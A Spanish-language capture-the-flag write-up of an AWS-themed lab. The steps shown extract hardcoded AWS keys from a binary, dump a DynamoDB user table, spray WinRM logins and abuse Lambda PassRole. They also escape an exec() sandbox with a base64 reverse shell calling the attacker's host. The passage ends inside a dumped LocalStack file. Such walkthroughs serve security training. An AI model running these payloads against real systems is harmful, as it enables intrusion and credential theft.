[+] Found 962 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: dynamo.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.8 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: /home/diseo/aws/_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/bin/database

You can now use a python decompiler on the pyc files within the extracted directory
```

Ahora si listamos veremos lo siguiente:

```
database_extracted
```

Vemos que nos ha extraido todo en una carpeta llamada `database_extracted`, vamos a entrar dentro de dicha carpeta y extraer los `strings` del archivo llamado `dynamo.pyc` a ver que vemos...

```shell
strings dynamo.pyc
```

Info:

```
................................<RESTO DE CODIGO>..................................
dynamodbz
http://cloud.amzcorp.local
AKIA5M37xxxxxxxxxxx
(HimNcdhuuNTYzG04Oxxxxxxxxxxxxxxxxx)
endpoint_url
aws_access_key_id
aws_secret_access_keyc
................................<RESTO DE CODIGO>..................................
```

Esto nos da a entender que es de una cuenta de `AWS` ya que el formato es el mismo, vamos a probarlo con la herramienta de `awscli` de esta forma:

```shell
sudo apt install awscli -y
```

Una vez instalado la herramienta, probaremos a configurar dichas credenciales desde la herramienta:

```shell
aws configure
```

Info:

```
AWS Access Key ID [None]: AKIA5M37xxxxxxxxx
AWS Secret Access Key [None]: HimNcdhuuNTYzGxxxxxxxxxxxxxxxxxxx  
Default region name [None]: us-east-1
Default output format [None]:
```

Hecho esto solicitaremos informacion de nuestras credenciales para identificar el usuario que somos dentro de `AWS` dentro del `enpoint` que hemos encontrado tambien.

```shell
aws --endpoint-url http://cloud.amzcorp.local sts get-caller-identity | jq
```

Info:

```
{
  "UserId": "AKIAC4G4xxxxxxxxxxxxx",
  "Account": "000000000000",
  "Arn": "arn:aws:iam::000000000000:user/john"
}
```

Veremos que somos el usuario `john`, si recordamos el `yaml` que encontramos anteriormente el cual nos descargamos del `subdominio` llamado `company-support` veremos estas lineas de aqui:

```yaml
DynamoDBTable:
    Type: 'AWS::DynamoDB::Table'
    Properties:
      TableName: Backup_Users
      AttributeDefinitions:
        - AttributeName: username
          AttributeType: S
        - AttributeName: password
          AttributeType: S
      KeySchema:
        - AttributeName: username
          KeyType: HASH
        - AttributeName: password
          KeyType: RANGE
      ProvisionedThroughput:
        ReadCapacityUnits: '5'
        WriteCapacityUnits: '5'
  JohnUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: john
      Path: /
      Policies:
        - PolicyName: dynamodb-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'dynamodb:Scan'
                Resource: '*'
```

Vemos que con este usuario podremos escanear la base de datos llamada `dynamodb` y en concreto ver la tabla `users` ya que suele ser lo normal, por lo que podremos hacer lo siguiente:

```shell
aws --endpoint-url http://cloud.amzcorp.local dynamodb scan --table-name users
```

Info:

```
{
    "Items": [
        {
            "password": {
                "S": "dE2*5$fG"
            },
            "username": {
                "S": "jason"
            }
        },
        {
            "password": {
                "S": "cGh#@0_gJ"
            },
            "username": {
                "S": "david"
            }
        },
        {
            "password": {
                "S": "dF4G0982#4%!"
            },
            "username": {
                "S": "olivia"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

Veremos que ha funcionado y la tabla `users` efectivamente existe, pudiendo ver varias credenciales de usuarios y contraseñas de los mismos.

Vamos a crear un listado de usuario y contraseñas.

> users.txt

```
jason
david
olivia
```

> pass.txt

```
dE2*5$fG
cGh#@0_gJ
dF4G0982#4%!
```

Ahora vamos a realizar una `fuerza bruta` mediante el servicio `WinRM` a ver si funciona algunas credenciales.

```shell
netexec winrm <IP> -u users.txt -p pass.txt
```

Info:

```
WINRM       10.13.37.15     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:amzcorp.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.13.37.15     5985   DC01             [-] amzcorp.local\jason:dE2*5$fG
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.13.37.15     5985   DC01             [-] amzcorp.local\david:dE2*5$fG
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.13.37.15     5985   DC01             [-] amzcorp.local\olivia:dE2*5$fG
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.13.37.15     5985   DC01             [-] amzcorp.local\jason:cGh#@0_gJ
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.13.37.15     5985   DC01             [+] amzcorp.local\david:cGh#@0_gJ (Pwn3d!)
```

### Evil-winrm (david)

Veremos que unas credenciales funcionaron, por lo que vamos a conectarnos con `evil-winrm` con dichas credenciales.

```shell
evil-winrm -i <IP> -u david -p 'cGh#@0_gJ'
```

Info:

```
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\david\Documents> whoami
amzcorp\david
```

Ya estaremos dentro de `WinRM` con el usuario `david`, por lo que leeremos la `flag` de dicho usuario.

> Jerry-built (Flag)

```
AWS{h4ng_1n_th3r3_f0r_m0r3_cl0ud}
```

## Line Up

Si probamos las otras credenciales con otros sitios webs de `AWS` de los `logins` veremos que en uno si nos sirve con el usuario `olivia` en el `subdominio` llamado `workflow.amzcorp.local`.

```
URL = http://workflow.amzcorp.local/
```

Si metemos las credenciales de `olivia:dF4G0982#4%!` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251228131816.png" alt=""><figcaption></figcaption></figure>

Vemos que estamos dentro con el usuario de `olivia`, si investigamos un poco veremos la seccion de `Admin` -> `Variables` entrando dentro veremos que son unas variables de credenciales a nivel de `AWS` las cuales podremos exportar pulsando en `Actions` -> `Export`, esto nos descargara un archivo de `variables.json` el cual si leemos veremos lo siguiente:

```json
{
    "AWS_ACCESS_KEY_ID": "AKIA5M34BDxxxxxxxxxx",
    "AWS_SECRET_ACCESS_KEY": "cnVpO1/EjpR7pger+ELxxxxxxxxxxxxxxxx"
}
```

Vamos a probarlas con la herramienta de `aws` a ver que usuario somos con esas credenciales.

```shell
aws configure
```

Info:

```
AWS Access Key ID [****************QDFP]: AKIA5M34Bxxxxxxxxxxxx
AWS Secret Access Key [****************0Rue]: cnVpO1/EjpR7pger+ELweFdbzxxxxxxxxxxxx
Default region name [us-east-1]:
Default output format [None]:
```

Ahora vamos a listar nuestro usuario de esta forma:

```shell
aws --endpoint-url http://cloud.amzcorp.local sts get-caller-identity | jq
```

Info:

```
{
  "UserId": "AKIAIOSFOxxxxxxxxxxxx",
  "Account": "000000000000",
  "Arn": "arn:aws:iam::000000000000:user/will"
}
```

Veremos que somos el usuario `will`, si buscamos dicho usuario en ese `yaml` que encontramos anteriormente veremos estas lineas:

```yaml
WillUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: will
      Path: /
      Policies:
        - PolicyName: lambda-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'Lambda:CreateFunction'
                  - 'Lambda:InvokeFunction'
                  - 'IAM:PassRole'
                Resource: ['arn:aws:lambda:*:*:function:*','arn:aws:iam::*:role/serviceadm']
```

Vemos que tenemos lo siguientes permisos:

1. **`lambda:CreateFunction`** → Crear funciones Lambda
2. **`lambda:InvokeFunction`** → Ejecutar funciones Lambda
3. **`iam:PassRole`** → Pasar el rol `serviceadm` a Lambda

Podremos crear e invocar funciones `lambda` bajo el `rol` de `serviceadm`, por lo que vamos a realizar una prueba de esta forma:

### RCE Lambada (AWS)

Probaremos a realizar un pequeño `RCE` ejecutando un `id` a ver si funciona, para que nos de el resultado como `output`.

> rce.py

```python
import os

def lambda_handler(event, context):
    return os.popen("id").read()
```

Lo comprimimos para que se lo podamos subir a `lambada`.

```shell
zip rce.zip rce.py
```

Ahora creamos dicha funciona para que vaya el archivo `adjunto` con la funcion.

```shell
aws --endpoint-url http://cloud.amzcorp.local lambda create-function --function-name rce --runtime python3.8 --role "arn:aws:iam::000000000000:role/serviceadm" --handler rce.lambda_handler --zip-file fileb://rce.zip | jq
```

Info:

```
{
  "FunctionName": "rce",
  "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:rce",
  "Runtime": "python3.8",
  "Role": "arn:aws:iam::000000000000:role/serviceadm",
  "Handler": "rce.lambda_handler",
  "CodeSize": 240,
  "Description": "",
  "Timeout": 3,
  "LastModified": "2025-12-28T13:03:53.434+0000",
  "CodeSha256": "e8q8sPrn7HSCwpxmaEPM7JsHwfo+HIA+gUcsfw6g6N4=",
  "Version": "$LATEST",
  "VpcConfig": {},
  "TracingConfig": {
    "Mode": "PassThrough"
  },
  "RevisionId": "a679c6d9-e07b-46c4-912a-586e52c82406",
  "State": "Active",
  "LastUpdateStatus": "Successful",
  "PackageType": "Zip"
}
```

Con este mensaje vemos que ha funcionado, ahora vamos a llamar a la funcion para poder ejecutar el comando que implementamos en el script.

```shell
aws --endpoint-url http://cloud.amzcorp.local lambda invoke --function-name rce output.txt | jq
```

Info:

```
{
  "StatusCode": 200,
  "LogResult": "",
  "ExecutedVersion": "$LATEST"
}
```

Aparentemente ha funcionado, si comprobamos el archivo que nos ha creado con el supuesto `output` del comando...

```shell
cat output.txt
```

Info:

```
"uid=993(sbx_user1051) gid=990 groups=990\n"
```

Veremos que efectivamente ha funcionado, pero algo muy curioso es que tenemos el `role` de `serviceadm` temporalmente ya que si pasa un rato este `rol` desaparece y no podemos hacer acciones desde el `aws` como dicho `rol`, por lo que si ejecutamos todo eso anterior y seguidamente nos da por revisar las funciones que tenemos disponibles para observar que mas podemos hacer...

```shell
aws --endpoint-url http://cloud.amzcorp.local lambda list-functions | jq
```

Info:

```
{
  "Functions": [
    {
      "FunctionName": "tracking_api",
      "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tracking_api",
      "Runtime": "python3.8",
      "Role": "arn:aws:iam::123456:role/irrelevant",
      "Handler": "code.lambda_handler",
      "CodeSize": 662,
      "Description": "",
      "Timeout": 3,
      "LastModified": "2025-12-25T18:54:24.724+0000",
      "CodeSha256": "HIkPHSeYh4DIQb5LaRF3ln8QjuajegZJsEyK8tCcxrU=",
      "Version": "$LATEST",
      "VpcConfig": {},
      "TracingConfig": {
        "Mode": "PassThrough"
      },
      "RevisionId": "d660021e-d459-4733-b8f5-9744adac8206",
      "State": "Active",
      "LastUpdateStatus": "Successful",
      "PackageType": "Zip"
    },
    {
      "FunctionName": "functions",
      "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:functions",
      "Runtime": "python3.8",
      "Role": "arn:aws:iam::000000000000:role/serviceadm",
      "Handler": "functions.lambda_handler",
      "CodeSize": 422,
      "Description": "",
      "Timeout": 3,
      "LastModified": "2025-12-28T13:19:50.086+0000",
      "CodeSha256": "EAI556EfB6sbztA02TNGi4gvis6uBIaP+r79PwLulM4=",
      "Version": "$LATEST",
      "VpcConfig": {},
      "TracingConfig": {
        "Mode": "PassThrough"
      },
      "RevisionId": "d4dda724-0ee7-44cf-b311-589d7b300b06",
      "State": "Active",
      "LastUpdateStatus": "Successful",
      "PackageType": "Zip"
    }
  ]
}
```

Veremos que funciona, ya que tenemos el `rol` temporalmente de `serviceadm` y vemos una funcion muy interesante que es `tracking_api` lo que parece ser una `API` de seguimiento, si profundizamos en dicha funcion para ver como es...

```shell
aws --endpoint-url http://cloud.amzcorp.local lambda get-function --function-name tracking_api
```

Info:

```
{
    "Configuration": {
        "FunctionName": "tracking_api",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tracking_api",
        "Runtime": "python3.8",
        "Role": "arn:aws:iam::123456:role/irrelevant",
        "Handler": "code.lambda_handler",
        "CodeSize": 662,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2025-12-25T18:54:24.724+0000",
        "CodeSha256": "HIkPHSeYh4DIQb5LaRF3ln8QjuajegZJsEyK8tCcxrU=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "d660021e-d459-4733-b8f5-9744adac8206",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://172.22.192.2:4566/2015-03-31/functions/tracking_api/code"
    },
    "Tags": {}
}
```

Veremos que hay un `code` el cual nos podremos descargar seguramente o que lleve algo interesante, pero para que no sea muy tedioso todo esto, vamos hacerlo un poco mas sencillo, interceptaremos la peticion con `BurpSuite` de cuando solicitamos la informacion de la funcion `tracking_api` y la modificaremos para que apunte a `code` y ver que nos responde el servidor.

Primero exportamos la variable para que cuando ejecutemos el comando lo intercepte `BurpSuite` estando a la escucha del mismo.

```shell
export http_proxy=http://127.0.0.1:8080
```

Ahora si ejecutamos de nuevo este comando:

```shell
aws --endpoint-url http://cloud.amzcorp.local lambda get-function --function-name tracking_api
```

Y nos vamos a `BurpSuite` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251228164021.png" alt=""><figcaption></figcaption></figure>

Le cambiamos lo ultimo a `code` quedando algo asi:

<figure><img src="../../.gitbook/assets/Pasted image 20251228164043.png" alt=""><figcaption></figcaption></figure>

Ahora si enviamos la respuesta al servidor veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251228164321.png" alt=""><figcaption></figcaption></figure>

Vemos que en la respuesta nos esta mostrando que en el contenido de `code` hay algunos archivos entre ellos la `flag` junto con un script de `python3` (`code.py`), vamos a descargarlo ya que la data es un archivo `.zip` por lo que parece, le daremos a `Copy to file` lo guardaremos como `code.zip` y ahora desde la terminal lo vamos a descomprimir.

```shell
unzip code.zip
```

Info:

```
Archive:  code.zip
warning [code.zip]:  643 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: code.py
  inflating: flag.txt
```

Veremos que funciono, por lo que leeremos la `flag` que contiene.

> Line Up (Flag)

```
AWS{i4m_w3ll_bu1lt_w1th0ut_bu1lt1ns}
```

### Forma 2 (Leer flag con Shell)

Si inspeccionamos el codigo de `code.py` veremos lo siguiente:

```python
import json
from urllib.parse import unquote
def lambda_handler(event, context):
    try:
        tracking_id = event['queryStringParameters']['id']
        tid = "id : '{}'"
        exec(tid.format(unquote(unquote(tracking_id))),{"__builtins__": {}}, {})
        # ToDo : Integrate with graphql in Q4
        if tid:
            return {
                'statusCode': 200,
                'body': json.dumps('Internal Server Error')
            }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps(f'Invalid Tracking ID. {e}')
        }
```

### RCE (tracking\_api)

Hay un **RCE (Remote Code Execution) crítico** en la función `tracking_api`. La vulnerabilidad está en esta línea:

```python
exec(tid.format(unquote(unquote(tracking_id))),{"__builtins__": {}}, {})
```

1. **`exec()`** con entrada del usuario → RCE
2. **Doble `unquote()`** - probablemente para manejar URL encoding
3. **Restricción de `__builtins__`** - pero se puede bypassear
4. La variable `tracking_id` viene de `event['queryStringParameters']['id']`

Sabiendo eso podremos crear un `JSON` con una configuracion en especifico aprovechando esa vulnerabilidad en dicha `API` para poder realizar un `RCE`, vamos a probar algo basico de primeras de esta forma:

```shell
echo "python3 -c \"import urllib.request; urllib.request.urlopen('http://10.10.14.105:7777/')\"" | base64 -w 0
```

Info:

```
cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vMTAuMTAuMTQuMTA1Ojc3NzcvJykiCg==
```

```shell
nano payload.json

#Dentro del nano
{
  "queryStringParameters": {
    "id": "1';a = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('echo cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vMTAuMTAuMTQuMTA1Ojc3NzcvJykiCg== | base64 -d | bash'); b = 'a"
  }
}
```

Lo guardamos y cargaremos el `JSON` de esta forma a dicha `API`, pero antes de ejecutar el comando nos pondremos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos dicho comando...

```shell
aws --endpoint http://cloud.amzcorp.local lambda invoke --function-name tracking_api --payload fileb://payload.json info.txt | jq
```

Info:

```
{
    "StatusCode": 200
}
```

***

> Info:

En tal caso de que os de un `200` como si estuviera funcionando, pero no veis nada de que os funcione, se debe a que el `rol` de `serviceadm` ha caducado, por lo que tendreis que volver a forzar dicho `rol` de nuevo solicitando los comandos anteriores para subir un `ZIP` en `lambada`, etc...

***

Veremos que ha funcionado, pero si ahora vamos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.105] from (UNKNOWN) [10.13.37.15] 56615
GET / HTTP/1.1
Accept-Encoding: identity
Host: 10.10.14.105:7777
User-Agent: Python-urllib/3.8
Connection: close

```

Con esto confirmamos el `RCE` que si esta funcionando por lo que vamos a establecer una `reverse shell` de esta forma, primero codificaremos nuestra `reverse shell` en `base64` para que sea mas discreta y funcione:

```shell
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP_ATTACKER>\",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" | base64 -w 0
```

Info:

```
cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMTA1Iiw3NzU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIiknCg==
```

Teniendo esto, vamos a implementarlo de esta forma en nuestro `JSON` quedando algo asi:

```json
{
  "queryStringParameters": {
    "id": "1';a = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMTA1Iiw3NzU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIiknCg== | base64 -d | bash'); b = 'a"  
  }
}
```

Nos pondremos a la escucha antes de enviar el comando de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos este comando para cargar el archivo y que se ejecute...

```shell
aws --endpoint http://cloud.amzcorp.local lambda invoke --function-name tracking_api --payload fileb://payload.json info.txt | jq
```

Volvemos a donde tenemos la escucha y veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [10.10.14.105] from (UNKNOWN) [10.13.37.15] 54698
bash-4.2$ whoami
whoami
sbx_user1051
bash-4.2$
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Long Run

Sabiendo que tenemos los privilegios de `administrador` en `AWS` gracias al `rol` de `serviceadm` probaremos a listar todas las colas `SQS disponibles` en el entorno `AWS`.

```shell
aws --endpoint-url http://cloud.amzcorp.local sqs list-queues | jq
```

Si ejecutamos eso anterior veremos que no encontraremos nada, lo cual es bastante raro, ya que tenemos los privilegios, pero tras muchas horas lo deje de lado para seguir con el laboratorio...

***

> Informacion de como obtuve esta `flag`

Tras muchas horas continue con el laboratorio normal ya que no podia conseguir esta `flag` pero cuando obtuve el usuario `admin` del dominio, investigue los `dockers` dentro del dominio que contenia el `AWS`, desde ahi obtuve la `flag`.

***

Una vez que seamos `Admins` del dominio dentro de la maquina victima (Para ello antes hay que seguir la `flag` de `Demolish`) listaremos los contenedores.

```powershell
docker images
```

Info:

```
REPOSITORY              TAG         IMAGE ID       CREATED       SIZE
proxy                   latest      0fd949c6a32a   3 years ago   522MB
support                 latest      a77b6f5cdb1d   3 years ago   798MB
jobs                    latest      d1e9a28edebd   3 years ago   875MB
inventory               latest      59d035dbcaf2   3 years ago   500MB
logs                    latest      734af983f49f   3 years ago   974MB
jobs_dev                latest      d32b4935940f   3 years ago   228MB
localstack              latest      0f9b9acf83e2   3 years ago   784MB
airflow                 latest      c0755c1247ff   3 years ago   599MB
localstack/localstack   0.12.13     69d93dd4669d   4 years ago   754MB
lambci/lambda           python3.8   094248252696   4 years ago   524MB
```

Veremos que el que nos interesa es `localstack/localstack`, por lo que vamos a ver su proceso.

```powershell
docker ps -a
```

Info:

```
CONTAINER ID   IMAGE                     COMMAND                  CREATED       STATUSPORTS                                    NAMES
d4947758ea73   lambci/lambda:python3.8   "/var/rapid/init --b…"   3 hours ago   Up 3 hours                                         kind_ellis
ce0f8311c98c   lambci/lambda:python3.8   "/var/rapid/init --b…"   3 hours ago   Up 3 hours                                         silly_chandrasekhar
c3d6843606ba   logs:latest               "gunicorn --config g…"   3 days ago    Up 3 days                                         logs
ac18ce4f0d35   jobs_dev:latest           "/usr/sbin/apache2 -…"   3 days ago    Up 3 days127.0.0.1:8005->80/tcp                   jobs-dev
350cccafd4c4   jobs:latest               "/usr/local/bin/dock…"   3 days ago    Up 3 days3306/tcp, 127.0.0.1:8003->5005/tcp       jobs
d77274080e09   support:latest            "bash -c /docker-ent…"   3 days ago    Up 3 days127.0.0.1:8004->5005/tcp                 support
629c18561246   airflow:latest            "bash /root/run.sh"      3 days ago    Up 3 days127.0.0.1:8002->80/tcp                   airflow
4f5bf8cf225c   proxy:latest              "bash /root/run.sh"      3 days ago    Up 3 days127.0.0.1:8000->80/tcp                   proxy
2a08c0fd18e6   localstack:latest         "docker-entrypoint.sh"   3 days ago    Up 3 days4566/tcp, 4571/tcp, 5678/tcp, 8080/tcp   localstack
97a4ed1fd910   inventory:latest          "bash run.sh"            3 days ago    Up 3 days127.0.0.1:8001->8000/tcp                 inventory
```

Vemos que es el del `ID` llamado `2a08c0fd18e6`, por lo que vamos a ejecutar comandos dentro del contenedor de esta forma:

```powershell
docker exec 2a0 id
```

Info:

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Veremos que funciona, tras una larga investigacion nos damos cuenta de este archivo en esta ruta:

```powershell
docker exec 2a0 ls -la /opt/code/localstack/localstack/
```

Info:

```
total 96
drwxr-xr-x    1 localsta localsta      4096 Jun 22  2021 .
drwxrwxrwx    1 localsta localsta      4096 Jan 18  2022 ..
-rw-rw-r--    1 localsta localsta         0 Jun 22  2021 __init__.py
drwxrwxr-x    2 localsta localsta      4096 Jun 22  2021 __pycache__
-rw-rw-r--    1 localsta localsta     19790 Jun 22  2021 config.py
-rw-rw-r--    1 localsta localsta      6344 Jun 22  2021 constants.py
drwxrwxr-x    3 localsta localsta      4096 Jun 22  2021 dashboard
drwxr-xr-x    1 localsta localsta      4096 Jun 22  2021 infra
drwxr-xr-x   48 localsta localsta      4096 Jun 17  2021 node_modules
-rw-rw-r--    1 localsta localsta       935 Jun 22  2021 package-lock.json
-rw-rw-r--    1 localsta localsta       388 Jun 22  2021 package.json
-rw-rw-r--    1 localsta localsta      7705 Jun 22  2021 plugins.py
-rw-rw-r--    1 localsta localsta      1707 Jun 22  2021 requirements.copy.txt
drwxrwxr-x    1 localsta localsta      4096 Jun 22  2021 services
drwxrwxr-x   10 localsta localsta      4096 Jun 22  2021 utils
```

Vamos a ver el contenido del archivo llamado `constants.py` que es el mas interesante y el que mas informacion puede llevar relevante.

```powershell
docker exec 2a0 cat /opt/code/localstack/localstack/constants.py
```

Info:

```python
import os
import localstack_client.config

# LocalStack version
VERSION = '0.12.13'

# constant to represent the "local" region, i.e., local machine
REGION_LOCAL = 'local'

# dev environment
ENV_DEV = 'dev'

# HTTP headers used to forward proxy request URLs
HEADER_LOCALSTACK_EDGE_URL = 'x-localstack-edge'
HEADER_LOCALSTACK_REQUEST_URL = 'x-localstack-request-url'
HEADER_LOCALSTACK_TARGET = 'x-localstack-target'
HEADER_AMZN_ERROR_TYPE = 'X-Amzn-Errortype'

# backend service ports, for services that are behind a proxy (counting down from 4566)
DEFAULT_PORT_EDGE = 4566
DEFAULT_PORT_WEB_UI = 8080

# host name for localhost
LOCALHOST = 'localhost'
LOCALHOST_IP = '127.0.0.1'
LOCALHOST_HOSTNAME = 'localhost.localstack.cloud'

# version of the Maven dependency with Java utility code
LOCALSTACK_MAVEN_VERSION = '0.2.5'

# map of default service APIs and ports to be spun up (fetch map from localstack_client)
DEFAULT_SERVICE_PORTS = localstack_client.config.get_service_ports()

# host to bind to when starting the services
BIND_HOST = '0.0.0.0'

# AWS user account ID used for tests
if 'TEST_AWS_ACCOUNT_ID' not in os.environ:
    os.environ['TEST_AWS_ACCOUNT_ID'] = '000000000000'
TEST_AWS_ACCOUNT_ID = os.environ['TEST_AWS_ACCOUNT_ID']

# root code folder
MODULE_MAIN_PATH = os.path.dirname(os.path.realpath(__file__))
# TODO rename to "ROOT_FOLDER"!
LOCALSTACK_ROOT_FOLDER = os.path.realpath(os.path.join(MODULE_MAIN_PATH, '..'))
INSTALL_DIR_INFRA = os.path.join(MODULE_MAIN_PATH, 'infra')

# virtualenv folder
LOCALSTACK_VENV_FOLDER = os.path.join(LOCALSTACK_ROOT_FOLDER, '.venv')
if not os.path.isdir(LOCALSTACK_VENV_FOLDER):
    # assuming this package lives here: <python>/lib/pythonX.X/site-packages/localstack/
    LOCALSTACK_VENV_FOLDER = os.path.realpath(os.path.join(LOCALSTACK_ROOT_FOLDER, '..', '..', '..'))

# API Gateway path to indicate a user request sent to the gateway
PATH_USER_REQUEST = '_user_request_'

# name of LocalStack Docker image
DOCKER_IMAGE_NAME = 'localstack/localstack'
DOCKER_IMAGE_NAME_FULL = 'localstack/localstack-full'

# backdoor API path used to retrieve or update config variables
CONFIG_UPDATE_PATH = '/?_config_'

# environment variable name to tag local test runs
ENV_INTERNAL_TEST_RUN = 'LOCALSTACK_INTERNAL_TEST_RUN'

# content types
APPLICATION_AMZ_JSON_1_0 = 'application/x-amz-json-1.0'
APPLICATION_AMZ_JSON_1_1 = 'application/x-amz-json-1.1'
APPLICATION_AMZ_CBOR_1_1 = 'application/x-amz-cbor-1.1'
APPLICATION_CBOR = 'application/cbor'
APPLICATION_JSON = 'application/json'
APPLICATION_XML = 'application/xml'
APPLICATION_X_WWW_FORM_URLENCODED = 'application/x-www-form-urlencoded'

# strings to indicate truthy/falsy values
TRUE_STRINGS = ('1', 'true', 'True')
FALSE_STRINGS = ('0', 'false', 'False')
LOG_LEVELS = ('trace', 'debug', 'info', 'warn', 'error', 'warning')

# Lambda defaults
LAMBDA_TEST_ROLE = 'arn:aws:iam::%s:role/lambda-test-role' % TEST_AWS_ACCOUNT_ID

# installation constants
ELASTICSEARCH_URLS = {
    '7.7.0': 'https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.7.0-linux-x86_64.tar.gz',
    '7.4.0': 'https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.4.0-linux-x86_64.tar.gz',
    '7.1.0': 'https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.1.0-linux-x86_64.tar.gz',
    '6.7.0': 'https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.7.0.zip'
}
ELASTICSEARCH_DEFAULT_VERSION = '7.7.0'
# See https://docs.aws.amazon.com/ja_jp/elasticsearch-service/latest/developerguide/aes-supported-plugins.html
ELASTICSEARCH_PLUGIN_LIST = ['analysis-icu', 'ingest-attachment', 'analysis-kuromoji',
